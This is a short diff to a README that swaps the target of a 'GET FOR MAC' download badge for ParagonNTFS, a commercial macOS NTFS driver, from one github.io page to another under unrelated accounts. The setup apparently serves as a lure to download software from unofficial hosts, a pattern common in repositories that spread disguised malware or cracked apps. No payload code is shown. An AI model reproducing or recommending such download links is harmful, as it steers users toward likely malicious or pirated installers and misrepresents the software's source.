@@ -8,7 +8,7 @@
 
 <div align="center">  
 
-[![Get for MacOS](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://software-osx-deploy.github.io/.github/ParagonNTFS)  
+[![Get for MacOS](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://apps-link-hub.github.io/.github/ParagonNTFS)  
 
 </div>  
 
